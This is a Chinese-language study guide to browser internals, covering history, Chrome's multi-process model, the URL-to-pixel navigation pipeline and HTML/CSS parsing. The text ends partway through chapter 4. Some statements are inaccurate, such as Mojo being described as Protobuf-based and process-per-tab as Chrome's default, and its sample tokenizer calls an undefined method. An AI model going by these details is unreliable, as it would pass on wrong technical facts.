# 浏览器前端基础知识指南（Browser Basics Guide）

> 适用读者：初中级前端工程师 / 准备面试的求职者 / 希望系统化梳理浏览器底层知识的开发者
> 文档版本：v1.0（2026-06）
> 涵盖内容：浏览器架构、渲染原理、JS 引擎、事件循环、安全、网络、存储、调试等 14 大主题

---

## 目录

- [第 1 章 浏览器概述](#第-1-章-浏览器概述)
- [第 2 章 浏览器进程与线程模型](#第-2-章-浏览器进程与线程模型)
- [第 3 章 从输入 URL 到页面展示](#第-3-章-从输入-url-到页面展示)
- [第 4 章 浏览器渲染引擎](#第-4-章-浏览器渲染引擎)
- [第 5 章 JavaScript 引擎](#第-5-章-javascript-引擎)
- [第 6 章 事件循环（Event Loop）](#第-6-章-事件循环event-loop)
- [第 7 章 DOM 事件机制](#第-7-章-dom-事件机制)
- [第 8 章 浏览器存储方案](#第-8-章-浏览器存储方案)
- [第 9 章 跨页面通信](#第-9-章-跨页面通信)
- [第 10 章 浏览器安全](#第-10-章-浏览器安全)
- [第 11 章 网络相关 API](#第-11-章-网络相关-api)
- [第 12 章 浏览器新特性 API](#第-12-章-浏览器新特性-api)
- [第 13 章 移动端浏览器特殊行为](#第-13-章-移动端浏览器特殊行为)
- [第 14 章 浏览器自动化与调试](#第-14-章-浏览器自动化与调试)
- [附录 A 浏览器知识速查表](#附录-a-浏览器知识速查表)
- [附录 B 综合实战案例：浏览器端监控 SDK](#附录-b-综合实战案例浏览器端监控-sdk)

---

# 第 1 章 浏览器概述

## 本章学习目标

- 了解浏览器从诞生至今的发展历程与里程碑事件
- 掌握主流浏览器内核（Rendering Engine）的差异
- 熟悉现代浏览器的多进程架构基本概念
- 理解 W3C（World Wide Web Consortium，万维网联盟）/WHATWG/ECMAScript 等标准化组织的作用

## 1.1 浏览器发展史

### 1.1.1 互联网前夜（1980s）

- 1989 年，蒂姆·伯纳斯-李（Tim Berners-Lee）在 CERN（欧洲核子研究组织）提出"万维网"（World Wide Web）的概念
- 1990 年，世界上第一个浏览器 **WorldWideWeb**（后改名 Nexus）诞生，同时第一个 Web 服务器 `info.cern.ch` 上线
- 1991 年，第一个 HTTP/0.9 协议被定义，仅支持 GET 请求和 HTML 响应

### 1.1.2 第一次浏览器大战（1993-2001）

```text
时间线：
  1993 Mosaic（NCSA）        —— 第一个支持图片内嵌显示的浏览器
  1994 Netscape Navigator    —— 商业浏览器先驱，引入 Cookie、JavaScript
  1995 IE 1.0（捆绑 Windows）—— 微软入局，免费策略
  1996 IE 3.0               —— CSS、JScript、ActiveX
  1998 Netscape → Mozilla   —— 开源战略调整
  2001 IE 6（Windows XP）   —— 巅峰期市场份额 > 95%
```

**关键事件**：
- **JavaScript 的诞生**：1995 年 Netscape 的 Brendan Eich 用 10 天设计了 LiveScript（后改名 JavaScript）
- **CSS 1.0 发布**：1996 年 W3C 发布 CSS Level 1，奠定样式与内容分离的基础
- **ECMAScript 标准化**：1997 年 ECMA（European Computer Manufacturers Association，欧洲计算机制造商协会）发布 ES1 标准

### 1.1.3 第二次浏览器大战（2003-2015）

```text
  2003 Safari（Apple，WebKit 内核）  —— iPod/iPhone 生态驱动
  2004 Firefox 1.0（Mozilla，Gecko）—— 体验与扩展性双优
  2008 Chrome（Google，Blink/WebKit）—— V8 引擎 + 多进程架构 + 极简 UI
  2015 Edge 诞生（EdgeHTML）        —— 微软放弃 IE 战略
  2018 Edge 转向 Chromium 内核
```

### 1.1.4 当下格局（2020+）

- **Chrome** 凭借 Blink + V8 + 庞大生态（DevTools / Puppeteer / Lighthouse）持续领跑
- **Edge** 切换 Chromium 后市场份额快速回升
- **Safari** 在 iOS 端具有强制地位（App Store 政策禁止第三方内核）
- **Firefox** 坚守 Gecko，承担多元化内核的责任

## 1.2 浏览器内核（Rendering Engine）

浏览器内核负责解析 HTML、CSS、执行 JS 并将内容绘制到屏幕。常见内核如下：

| 内核 | 采用浏览器 | 关键特点 |
| --- | --- | --- |
| Trident | IE 6-11 | 已停止维护，CSS 兼容性差 |
| Gecko | Firefox | 完整 W3C 规范支持，跨平台 |
| WebKit | Safari、旧 Chrome | 苹果维护，KHTML 衍生 |
| Blink | Chrome、Edge、Opera | WebKit 分支，Google 主导 |

### 1.2.1 内核分层

```text
浏览器（Browser）
  ├── UI 层（地址栏 / 书签 / 设置）
  ├── 网络层（HTTP / DNS / TLS）
  ├── 渲染引擎（Rendering Engine）
  │     ├── HTML 解析器（HTML Parser）
  │     ├── CSS 解析器（CSS Parser）
  │     ├── 布局（Layout）
  │     ├── 绘制（Paint）
  │     └── 合成（Compositor）
  ├── JavaScript 引擎（JS Engine）
  │     └── V8 / JavaScriptCore / SpiderMonkey
  ├── 存储（Storage）
  │     └── IndexedDB / LocalStorage / Cookie
  └── 设备接口（Device API）
        └── Geolocation / Bluetooth / USB ...
```

## 1.3 浏览器市场份额（参考 2025 数据）

```text
桌面端（按使用量）：
  Chrome   ~ 65%
  Edge     ~ 13%
  Safari   ~ 10%
  Firefox  ~ 6%
  Opera    ~ 2%
  其他     ~ 4%

移动端（按使用量）：
  Chrome（Android）  ~ 65%
  Safari（iOS）      ~ 25%
  Samsung Internet   ~ 4%
  UC / QQ / 夸克     ~ 各 2-3%
```

> **小贴士**：开发时建议兼容「最新两个版本」即可（ESR 政策），无需过度兼容老旧内核。

## 1.4 W3C / WHATWG / TC39

- **W3C**：万维网联盟，制定 HTML、CSS、SVG、Web API 等标准
- **WHATWG**：Web Hypertext Application Technology Working Group（网页超文本应用技术工作组），由 Apple/Mozilla/Google 等组成，2019 年与 W3C 达成 HTML 标准统一协议
- **TC39**（Technical Committee 39）：ECMA 下的技术委员会，负责 ECMAScript（JavaScript 标准）的演进
- **ECMA-262**：JavaScript 语言规范
- **ECMA-402**：国际化 API 规范（Intl）
- **ECMA-404**：JSON 数据交换格式

## 1.5 现代浏览器架构概述

```mermaid
graph TB
  A[用户界面 Browser UI] --> B[浏览器主进程 Browser Process]
  B --> C[GPU 进程]
  B --> D[网络进程]
  B --> E[渲染进程 1]
  B --> F[渲染进程 2]
  B --> G[插件进程]
  B --> H[Utility 进程]

  E --> I[主线程 Main Thread]
  E --> J[合成线程 Compositor Thread]
  E --> K[光栅线程 Raster Thread]
  E --> L[IO 线程 IO Thread]

  style B fill:#f9f,stroke:#333
  style E fill:#bbf,stroke:#333
  style I fill:#bfb,stroke:#333
```

现代浏览器的核心思想是 **"沙箱隔离 + 多进程"**：
- 稳定性：单个页面崩溃不影响整体
- 安全性：进程级沙箱限制权限
- 性能：并行处理提升吞吐

## 本章要点速查

| 概念 | 关键点 |
| --- | --- |
| 浏览器大战 | 两次，IE 主导期 vs Chrome 主导期 |
| 主流内核 | Blink（Chrome/Edge）、WebKit（Safari）、Gecko（Firefox） |
| 标准化组织 | W3C / WHATWG / TC39 / ECMA |
| 浏览器架构 | 多进程 + 沙箱 + 多线程 |

---

# 第 2 章 浏览器进程与线程模型

## 本章学习目标

- 理解 Chrome 为何采用多进程架构
- 掌握浏览器进程（Process）与线程（Thread）的关系
- 熟悉进程间通信（IPC）机制
- 理解 Site Isolation（站点隔离）的安全意义

## 2.1 进程与线程基础

### 2.1.1 进程（Process）

进程是操作系统进行资源分配和调度的基本单位。每个进程拥有独立的内存空间、文件句柄、信号量等。

```text
进程的特点：
  - 独立地址空间（4GB / 128TB，虚拟内存）
  - 崩溃不影响其他进程
  - 进程间通信成本高（IPC：管道 / 消息队列 / 共享内存 / Socket）
  - 创建/切换开销大
```

### 2.1.2 线程（Thread）

线程是进程内的执行单元，共享进程资源（堆、方法区），但拥有独立的栈与寄存器。

```text
线程的特点：
  - 共享进程内存（需同步：锁 / 信号量 / 原子操作）
  - 轻量，创建/切换开销小
  - 一个线程崩溃可能导致整个进程崩溃
  - 适合 I/O 密集型任务（Web 异步）
```

### 2.1.3 浏览器中的进程/线程对比

```javascript
// 在 Chrome 任务管理器（Shift+Esc）中可观察：
// - 进程（Process）：通常有 1 个 Browser 进程 + N 个 Renderer 进程
// - 线程（Thread）：每个 Renderer 进程内有主线程、合成线程、IO 线程、栅格化线程等
```

## 2.2 Chrome 多进程架构详解

```mermaid
graph TB
  subgraph "Browser Process 浏览器主进程"
    UI[UI 线程<br/>地址栏 / 书签]
    NetworkThread[网络线程]
    StorageThread[存储线程]
    DevToolsThread[DevTools 线程]
  end

  subgraph "Renderer Process 渲染进程"
    MainThread[主线程<br/>JS / Layout / Paint]
    CompositorThread[合成线程]
    RasterThread[光栅化线程]
    IOThread[IO 线程]
  end

  GPU[GPU 进程<br/>硬件加速]
  Plugin[插件进程]
  Utility[Utility 进程<br/>网络服务 / 音频服务]

  BrowserProcess -->|IPC Mojo| Renderer
  BrowserProcess --> GPU
  BrowserProcess --> Plugin
  BrowserProcess --> Utility
```

### 2.2.1 浏览器主进程（Browser Process）

负责管理浏览器整体行为：

```text
主进程职责：
  1. UI 线程
     - 地址栏、书签栏、菜单
     - 前进/后退按钮逻辑
  2. 网络线程
     - DNS 查询
     - TLS 握手
     - HTTP 请求
  3. 存储线程
     - Cookie 读写
     - LocalStorage
     - IndexedDB
  4. 设备权限管理
     - 通知、定位、相机、麦克风授权
  5. 子进程管理
     - 启动/回收 Renderer
     - 进程优先级
```

### 2.2.2 渲染进程（Renderer Process）

每个 Tab 默认一个渲染进程（同源情况下可合并）。职责：

```text
渲染进程职责：
  1. 主线程（Main Thread）
     - 解析 HTML/CSS → 构建 DOM/CSSOM
     - 布局（Layout）→ 绘制（Paint）
     - 执行 JavaScript（V8 引擎）
  2. 合成线程（Compositor Thread）
     - 图层合成
     - 滚动事件处理
     - CSS 动画
  3. 光栅化线程（Raster Thread / Worker）
     - 将图层光栅化为位图
     - GPU 加速上传
  4. IO 线程（IO Thread）
     - 与浏览器主进程通信
     - 接收 IPC 消息
```

### 2.2.3 GPU 进程

```text
GPU 进程：
  - 在独立进程中处理所有 GPU 任务
  - 设计原因：
    1. 隔离 GPU 驱动 bug，避免主进程崩溃
    2. 多窗口可共享同一 GPU 资源
  - 实际工作：
    - 合成器（Compositor）的最终输出提交到 GPU
    - WebGL / Canvas 2D 硬件加速
```

### 2.2.4 网络进程（Network Service）

自 Chrome 67 起独立为 Network Service 进程，统一处理网络请求。

```javascript
// 在 DevTools Network 面板中可观察：
// 每个请求的状态行 / 耗时分解 / 远程地址 / Cookie / 缓存
// 这些元数据由网络进程收集后通过 IPC 发送给渲染进程
```

### 2.2.5 插件进程（Plugin Process）

用于运行 NPAPI/PPAPI 插件（如 PDF Viewer），每个插件一个进程（沙箱）。

### 2.2.6 Utility Process

Chrome 内部的多用途进程，包括：
- `Network Service`
- `Audio Service`
- `Storage Service`
- `Push Message Service`
- `Profile Import Service`

## 2.3 Renderer 进程内部线程模型

```mermaid
graph LR
  subgraph "Renderer Process 渲染进程"
    IO[IO 线程<br/>接收 IPC 消息]
    Main[主线程<br/>V8 执行 / Style / Layout / Paint]
    Compositor[合成线程<br/>合成与滚动]
    Raster1[光栅线程 1]
    Raster2[光栅线程 2]
    Raster3[光栅线程 3]
  end

  BrowserP[Browser Process] <-->|Mojo IPC| IO
  IO -->|任务调度| Main
  Main -->|绘制命令| Compositor
  Compositor -->|光栅化任务| Raster1
  Compositor -->|光栅化任务| Raster2
  Compositor -->|光栅化任务| Raster3
  Raster1 -->|位图上传 GPU| GPU[GPU 进程]
```

### 2.3.1 主线程执行模型

```javascript
// 主线程是单线程（事件循环），JS 执行与渲染互斥
// 长时间任务会阻塞渲染
// 例：以下代码会卡顿
function heavyTask() {
  let start = Date.now();
  // Step 1：模拟耗时计算
  while (Date.now() - start < 5000) {
    // 5 秒死循环
  }
  console.log('done');
}
// 解决方案：使用 Web Worker 或 requestIdleCallback
```

### 2.3.2 合成线程

合成线程是渲染进程中独立于主线程的线程，负责：

```text
合成线程职责：
  - 处理滚动（即便主线程卡顿，滚动也能保持 60fps）
  - CSS transform / opacity 动画
  - 将多个图层（Layer）合成为一帧并提交给 GPU
```

### 2.3.3 IO 线程

IO 线程负责与浏览器主进程通信，是渲染进程的消息中心。

```text
IO 线程消息流：
  1. 接收来自 Browser 的 IPC 消息（导航请求 / 网络响应）
  2. 解析后转发到主线程
  3. 主线程产生的绘制命令通过 IO 线程送回 Browser，再由 Browser 转交 GPU
```

## 2.4 进程间通信（IPC）

Chrome 使用 **Mojo**（基于 Protobuf 的 IPC 框架）作为进程间通信协议。

### 2.4.1 进程间通信的三种方式

```text
1. 共享内存（Shared Memory）
   - 视频帧、音频流
   - 写入端：渲染进程 → 读取端：GPU 进程
2. 消息管道（Mojo Message Pipe）
   - 任务调度、事件通知
3. 服务化（Service Manager）
   - 类似微服务架构，进程可订阅/发布服务
```

### 2.4.2 典型 IPC 场景

```text
场景 1：用户输入 URL
  Browser Network 线程 → DNS 解析
  → 建立 TCP/TLS 连接
  → 发送 HTTP 请求
  → 收到响应
  → IPC 通知 Renderer 进程：开始解析
  → Renderer 主线程解析 HTML

场景 2：页面发起 fetch('/api/data')
  Renderer 主线程 → IPC 发送给 Browser
  → Browser 网络线程发起请求
  → 响应回传
  → Renderer 收到回调

场景 3：用户点击链接
  Renderer 通知 Browser（IPC）
  → Browser 更新地址栏 / 历史记录
  → 启动新 Renderer / 复用旧 Renderer
  → 导航到新 URL
```

## 2.5 Site Isolation（站点隔离）

### 2.5.1 同源策略的局限

传统同源策略在单进程中通过域隔离即可生效；但多 Tab 共享 Renderer 进程时，若两个 Tab 不同源，则属于同一进程，理论上可绕过 SOP（Same Origin Policy）。

### 2.5.2 Site Isolation 机制

Chrome 自 67 启用 Site Isolation：

```text
Site Isolation 行为：
  - 每个 Site（注册域 + 协议 + 端口）独立 Renderer 进程
  - 跨站 iframe 也运行在独立进程中
  - 例：
      a.com 主页面 → 进程 A
      b.com iframe  → 进程 B
    进程间通过 IPC 通信

  - 防御目标：
      1. Spectre 侧信道攻击
      2. 跨站脚本提权
      3. 共享渲染资源泄露
```

### 2.5.3 进程沙箱（Sandbox）

```text
沙箱目标：
  - 渲染进程只能访问受限资源
  - 不允许直接访问文件系统、网络
  - 任何敏感操作必须通过 IPC 向 Browser 进程申请
  - Windows: Restricted Token + Job Object
  - macOS:  Seatbelt sandbox profile
  - Linux: seccomp-bpf + namespaces
```

## 2.6 进程模式：Process-per-Site vs Process-per-Tab

```javascript
// Chrome 启动参数控制进程模式
// 1. --process-per-site：每个 Site 一个进程（同站多 Tab 共享）
// 2. --process-per-tab：每个 Tab 一个进程（默认）

// 内存消耗对比：
// Process-per-Site：内存更省
// Process-per-Tab：隔离性更好
```

## 2.7 进程管理与回收

```text
Chrome 进程回收策略：
  - 后台 Tab 进程会被冻结（Freeze），节省 CPU 与内存
  - 内存压力过高时触发"Discarded Tab"（最小化状态）
  - 内存压力指标：commitChargeMB（已分配但未使用的虚拟内存）
```

## 本章要点速查

| 概念 | 关键点 |
| --- | --- |
| Browser 进程 | 唯一，负责 UI/网络/存储 |
| Renderer 进程 | 每个 Site 一个，Site Isolation 后每个跨站 iframe 独立 |
| GPU 进程 | 独立，统一处理 GPU 任务 |
| IPC 机制 | Mojo（基于 Protobuf） |
| 沙箱 | 进程级权限隔离 |
| 合成线程 | 独立于主线程，处理滚动与 transform |

---

# 第 3 章 从输入 URL 到页面展示

## 本章学习目标

- 完整掌握「在地址栏输入 URL 后发生了什么」的每个环节
- 理解 DNS 解析、TCP/TLS 握手、HTTP 请求/响应的底层机制
- 掌握浏览器从字节流到最终像素的完整渲染管线
- 优化关键路径，缩短首屏时间

## 3.1 整体流程概览

```mermaid
sequenceDiagram
    participant U as 用户
    participant B as Browser Process
    participant N as Network
    participant R as Renderer Process
    participant GPU as GPU Process

    U->>B: 输入 URL 并回车
    B->>B: 1. URL 解析
    B->>B: 2. 检查 HSTS / 缓存
    B->>N: 3. DNS 解析
    N-->>B: 返回 IP
    B->>N: 4. TCP 三次握手
    N-->>B: 5. TLS 握手（HTTPS）
    B->>N: 6. 发送 HTTP 请求
    N-->>B: 7. 接收 HTTP 响应
    B->>R: 8. IPC: 提交导航
    R->>R: 9. 解析 HTML/CSS
    R->>R: 10. 构建 DOM/CSSOM
    R->>R: 11. 布局 Layout
    R->>R: 12. 绘制 Paint
    R->>R: 13. 合成 Compositing
    R->>GPU: 14. 提交帧
    GPU-->>U: 15. 显示像素
```

## 3.2 第一步：URL 解析

### 3.2.1 URL 结构

```text
https://user:pass@www.example.com:8080/path/to?query=1#fragment
 \__/   \______/ \______________/\__/\________/\_________/\________/
  协议   用户信息      主机名        端口    路径       查询参数     片段
```

### 3.2.2 编码处理

```javascript
// 非 ASCII 字符会进行 URL 编码（percent-encoding）
// 例："中文" → "%E4%B8%AD%E6%96%87"
const url = 'https://example.com/搜索?q=测试';
const encoded = encodeURI(url);
// "https://example.com/%E6%90%9C%E7%B4%A2?q=%E6%B5%8B%E8%AF%95"

// 浏览器实际使用的编码规则
const component = encodeURIComponent('中 文');
// "%E4%B8%AD%20%E6%96%87"
```

## 3.3 第二步：缓存检查

浏览器按以下顺序检查：

```text
1. Service Worker
   - 注册的 SW 拦截 fetch 事件
   - 命中则使用缓存
2. HTTP 缓存（强缓存 / 协商缓存）
   - memory cache（200 状态、js/css）
   - disk cache（缓存到磁盘）
3. 浏览器历史记录（仅 back/forward）
   - BFCache（Back-Forward Cache）
```

```javascript
// HTTP 缓存相关响应头
// 强缓存：
//   Cache-Control: max-age=3600
//   Expires: Wed, 21 Oct 2026 07:28:00 GMT

// 协商缓存：
//   Last-Modified / If-Modified-Since
//   ETag / If-None-Match
```

## 3.4 第三步：DNS 解析

### 3.4.1 DNS 查询流程

```mermaid
sequenceDiagram
    participant B as 浏览器
    participant OS as OS DNS 缓存
    participant R as 本地 DNS Resolver
    participant Root as 根 DNS
    participant TLD as 顶级域 DNS
    participant Auth as 权威 DNS

    B->>OS: hosts 文件 / 缓存
    OS-->>B: 未命中
    B->>R: 查询 www.example.com
    R->>Root: 查询 .com
    Root-->>R: 指向 .com TLD 服务器
    R->>TLD: 查询 example.com
    TLD-->>R: 指向 example.com NS
    R->>Auth: 查询 www.example.com
    Auth-->>R: 返回 IP 1.2.3.4
    R-->>B: 1.2.3.4
```

### 3.4.2 DNS 优化手段

```text
1. DNS 预解析（DNS Prefetch）
   <link rel="dns-prefetch" href="//cdn.example.com">
2. preconnect（提前 TCP/TLS 握手）
   <link rel="preconnect" href="https://api.example.com">
3. HTTP/2 服务端推送（已废弃）
4. HTTP/3 + QUIC 减少握手
5. HTTPDNS（绕过 Local DNS，防劫持）
6. DoH（DNS over HTTPS）
```

## 3.5 第四步：TCP 三次握手

```text
Client → Server: SYN = x                  （第一次：客户端请求建立连接）
Server → Client: SYN = y, ACK = x + 1     （第二次：服务端确认并请求）
Client → Server: ACK = y + 1              （第三次：客户端确认）

完成：ESTABLISHED 状态
```

```text
为什么需要三次：
  - 防止已失效的连接请求报文突然又传送到服务器
  - 双方确认彼此的发送/接收能力
```

## 3.6 第五步：TLS 握手（HTTPS）

### 3.6.1 TLS 1.3 握手流程

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server

    C->>S: ClientHello（含支持的密码套件 / key_share）
    S->>C: ServerHello + Certificate + CertificateVerify + Finished
    Note over C,S: 双方基于 key_share 计算预主密钥
    C->>S: Finished
    Note over C,S: 加密通道建立
```

### 3.6.2 TLS 1.3 vs TLS 1.2

```text
TLS 1.2：
  - 2-RTT（2 轮往返）
  - 支持更多旧算法

TLS 1.3：
  - 1-RTT
  - 0-RTT（Early Data，需配合 anti-replay）
  - 强制前向保密（PFS）
  - 移除不安全算法（RC4、SHA-1 等）
```

### 3.6.3 HTTPS 优化

```text
1. Session Resumption
   - Session ID
   - Session Ticket
2. TLS False Start
3. OCSP Stapling
4. ECDHE 密钥交换（更快的椭圆曲线）
5. HTTP/3（QUIC，集成 TLS 1.3）
```

## 3.7 第六步：HTTP 请求与响应

### 3.7.1 HTTP 请求报文

```http
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/...
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=abc123
Connection: keep-alive
```

### 3.7.2 HTTP 响应报文

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Encoding: gzip
Content-Length: 1234
Cache-Control: max-age=3600
ETag: "abc123"
Set-Cookie: id=xyz; Path=/; HttpOnly; Secure
```

### 3.7.3 HTTP/2 与 HTTP/3

```text
HTTP/1.1：
  - 文本协议
  - 队头阻塞（HOL Blocking）
  - 同一连接只能处理一个请求（除非浏览器放宽限制）
  - 6-8 个并发连接

HTTP/2：
  - 二进制分帧（Binary Framing）
  - 多路复用（Multiplexing）
  - 头部压缩（HPACK）
  - 服务器推送（Server Push，已废弃）
  - 流量优先级

HTTP/3：
  - 基于 QUIC（UDP）
  - 解决 TCP 层队头阻塞
  - 0-RTT 握手
  - 内置 TLS 1.3
  - 连接迁移（Connection Migration）
```

## 3.8 第七步：服务器响应处理

```text
服务器处理流程：
  1. 反向代理（Nginx / Envoy）路由
  2. Web 服务器（Node.js / Tomcat）接收请求
  3. 应用层处理（Controller / Service / DB）
  4. 渲染 HTML（SSR）或返回 JSON
  5. 写入响应 + Transfer-Encoding: chunked
  6. TCP 分段发送
```

### 3.8.1 关键响应头

```http
Content-Encoding: gzip            # 响应压缩
Transfer-Encoding: chunked        # 分块传输
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## 3.9 第八步：浏览器接收响应

```text
1. 数据流式接收（chunked）
2. 解压（gzip / brotli）
3. 字符编码解析（utf-8 / gbk）
4. 移交渲染进程解析
```

## 3.10 第九步：渲染流水线（详见第 4 章）

```text
核心步骤：
  1. HTML Parser → DOM 树
  2. CSS Parser → CSSOM 树
  3. JavaScript Engine → 编译执行
  4. Style 计算 → ComputedStyle
  5. Layout（Reflow）→ 布局树
  6. Paint → 绘制记录
  7. Compositing → 图层合成
  8. GPU 提交 → 像素显示
```

## 3.11 第十步：关键渲染路径优化

### 3.11.1 关键资源

```text
关键资源（Critical Resources）：
  - 阻塞渲染的 CSS（head 中的 link）
  - 阻塞解析的 JS（head 中的 script，无 async/defer）
  - Web Font（影响首字渲染）
```

### 3.11.2 优化策略

```html
<!-- 1. CSS 异步加载 -->
<link rel="preload" href="critical.css" as="style">
<link rel="stylesheet" href="critical.css">

<!-- 2. JS 异步加载 -->
<script src="app.js" defer></script>      <!-- 并行下载，DOMContentLoaded 前执行 -->
<script src="analytics.js" async></script> <!-- 独立执行，不保证顺序 -->

<!-- 3. 字体优化 -->
<link rel="preload" href="font.woff2" as="font" type="font/woff2" crossorigin>
<style>
  @font-face {
    font-family: 'MyFont';
    src: url('font.woff2') format('woff2');
    font-display: swap;  /* 避免 FOIT */
  }
</style>
```

## 3.12 性能指标

```text
W3C Navigation Timing Level 2 / Performance API：
  - navigationStart：导航开始
  - responseStart：首字节到达
  - domInteractive：DOM 可交互
  - domContentLoadedEventEnd：DCL 事件触发
  - loadEventStart：load 事件触发
  - FP（First Paint）：首次绘制
  - FCP（First Contentful Paint）：首次内容绘制
  - LCP（Largest Contentful Paint）：最大内容绘制
  - TTI（Time to Interactive）：可交互时间
  - TBT（Total Blocking Time）：总阻塞时间
  - CLS（Cumulative Layout Shift）：累计布局偏移
```

### 3.12.1 PerformanceObserver 使用

```javascript
// 监控 LCP
const lcpObserver = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('LCP:', entry.startTime);
  }
});
lcpObserver.observe({ type: 'largest-contentful-paint', buffered: true });

// 监控长任务（Long Task）
const longTaskObserver = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.warn('Long Task detected:', entry.duration);
  }
});
longTaskObserver.observe({ type: 'longtask', buffered: true });
```

## 本章要点速查

| 阶段 | 关键点 | 优化方向 |
| --- | --- | --- |
| URL 解析 | 协议/域名/端口/路径 | URL 标准化 |
| DNS 解析 | 浏览器/系统/路由器/ISP DNS | DNS 预解析 |
| TCP 握手 | 三次 | 持久连接、TFO |
| TLS 握手 | TLS 1.3 / 1-RTT | Session Resumption |
| HTTP 请求 | keep-alive / 多路复用 | HTTP/2、HTTP/3 |
| 响应 | chunked / gzip | 压缩、缓存 |
| 渲染 | DOM/CSSOM/布局/绘制 | 关键路径优化 |

---

# 第 4 章 浏览器渲染引擎

## 本章学习目标

- 掌握 HTML 解析器、DOM 树构建的完整流程
- 理解 CSS 解析、CSSOM 构建、样式计算
- 深入 Layout / Paint / Compositing 的工作机制
- 熟悉常见性能问题（重排 / 重绘）的优化方法

## 4.1 渲染引擎总体流程

```mermaid
graph TB
  A[字节流 Bytes] -->|HTML 解析| B[DOM 树]
  C[字节流 Bytes] -->|CSS 解析| D[CSSOM 树]
  B & D --> E[Render Tree 渲染树]
  E -->|Style 计算| F[Computed Style]
  F -->|Layout 布局| G[Layout Tree 布局树]
  G -->|Paint 绘制| H[Paint Records 绘制记录]
  H -->|Compositing 合成| I[Layers 图层]
  I -->|GPU 上传| J[屏幕像素]
```

## 4.2 HTML 解析与 DOM 树

### 4.2.1 HTML 解析器工作原理

HTML 解析器是浏览器内置的、容错性极强的标记语言解析器。不同于 XML 解析器，它采用**词法分析 + 状态机**模式。

```text
HTML Parser 特点：
  - 容错：自动闭合、补全元素（如未闭合的 <p>）
  - 边解析边构建 DOM（Streaming）
  - 遇到 <script>（无 async/defer）会暂停解析，等待执行
  - 遇到 <link rel="stylesheet"> 异步加载但阻塞渲染
  - 使用预解析线程（Speculative Parser）提前发现外链资源
```

### 4.2.2 词法分析（Tokenizer）

将字符流转换为 **Token**（StartTag / EndTag / Text / Comment / Doctype）。

```javascript
// 简化版 Tokenizer 示例
class HTMLTokenizer {
  constructor(input) {
    this.input = input;  // 输入的 HTML 字符串
    this.pos = 0;         // 当前解析位置
    this.tokens = [];     // 解析出的 token 列表
  }

  // Step 1：主循环，逐字符扫描
  tokenize() {
    while (this.pos < this.input.length) {
      const char = this.input[this.pos];

      if (char === '<') {
        if (this.input[this.pos + 1] === '/') {
          this.parseEndTag();     // 闭合标签
        } else {
          this.parseStartTag();   // 开始标签
        }
      } else {
        this.parseText();         // 文本节点
      }
    }
    return this.tokens;
  }

  // Step 2：解析开始标签
  parseStartTag() {
    // 例：<div class="foo">
    this.pos++; // 跳过 '<'
    const tagNameMatch = /[a-zA-Z][a-zA-Z0-9-]*/.exec(this.input.slice(this.pos));
    if (!tagNameMatch) return;
    const tagName = tagNameMatch[0];
    this.pos += tagName.length;

    // 解析属性
    const attrs = {};
    while (this.input[this.pos] !== '>' && this.input[this.pos] !== '/') {
      const attrMatch = /([a-zA-Z-]+)\s*=\s*"([^"]*)"/.exec(this.input.slice(this.pos));
      if (attrMatch) {
        attrs[attrMatch[1]] = attrMatch[2];
        this.pos += attrMatch[0].length;
      } else {
        this.pos++;
      }
    }
    this.pos++; // 跳过 '>'
    this.tokens.push({ type: 'StartTag', name: tagName, attrs });
  }

  // Step 3：解析文本
  parseText() {
    let text = '';
    while (this.pos < this.input.length && this.input[this.pos] !== '<') {
      text += this.input[this.pos++];
    }
    this.tokens.push({ type: 'Text', value: text });
  }
}
```

### 4.2.3 树构建（Tree Builder）

将 Token 流构建为 DOM 树，使用 **栈结构** 处理父子关系：

```text
算法伪代码：
  stack = []
  for token in tokens:
    if token.type == 'StartTag':
      node = createNode(token)
      if stack.length > 0:
        stack.top().appendChild(node)
      stack.push(node)
    elif token.type == 'EndTag':
      stack.pop()
    elif token.type == 'Text':
      if stack.length > 0:
        stack.top().appendChild(textNode)
```

### 4.2.4 DOM 树结构

```html
<!DOCTYPE html>
<html>
  <head>
    <title>示例</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <h1>标题</h1>
    <p class="content">正文<span>嵌套</span></p>
    <script src="app.js"></script>
  </body>
</html>
```

对应 DOM 树：

```text
Document
 ├── DocumentType
 └── html
      ├── head
      │    ├── title
      │    │    └── TextNode "示例"
      │    └── meta
      └── body
           ├── h1
           │    └── TextNode "标题"
           └── p.content
                ├── TextNode "正文"
                └── span
                     └── TextNode "嵌套"
```

## 4.3 CSS 解析与 CSSOM

### 4.3.1 CSSOM 构建

CSS 解析器将 CSS 文本转换为 CSSOM 树：

```css
/* style.css */
body { font-size: 16px; }
.content { color: blue; }
.content span { font-weight: bold; }
```

```text
CSSOM 树（部分）：
  - body (font-size: 16px)
    - .content (color: blue)
      - span (font-weight: bold)
```

### 4.3.2 CSS 选择器匹配

```javascript
// 浏览器内部使用从右向左匹配（Right-to-Left Matching）
// 原因：减少搜索空间
// 例：.content span
// 错误做法：先找 .content，再找后代中的 span（需遍历所有后代）
// 正确做法：先找所有 span，再向上检查祖先是否有 .content

function matchSelector(element, selector) {
  // Step 1：拆分选择器
  const parts = selector.split(' ').reverse();
  // Step 2：从当前元素向上遍历
  let current = element;
  for (const part of parts) {
    if (!current) return false;
    if (!matchesSingle(current, part)) return false;
    current = current.parentElement;
  }
  return true;
}

function matchesSingle(el, selector) {
  // id / class / tag
  if (selector.startsWith('.')) {
    return el.classList.contains(selector.slice(1));
  }
  if (selector.startsWith('#')) {
    return el.id === selector.slice(1);
  }
  return el.tagName.toLowerCase() === selector;
}
```

## 4.4 渲染树（Render Tree）

DOM 树 + CSSOM 树 → Render Tree（仅包含可见节点）。

```text
排除规则：
  - display: none 的元素不进入 Render Tree
  - <script>、<meta>、<link> 等不可见元素不进入
  - 注释节点不进入

注意：visibility: hidden 的元素仍会进入 Render Tree，但不绘制
```

```mermaid
graph TB
  DOM[DOM 树] --> RT[Render Tree]
  CSSOM[CSSOM 树] --> RT
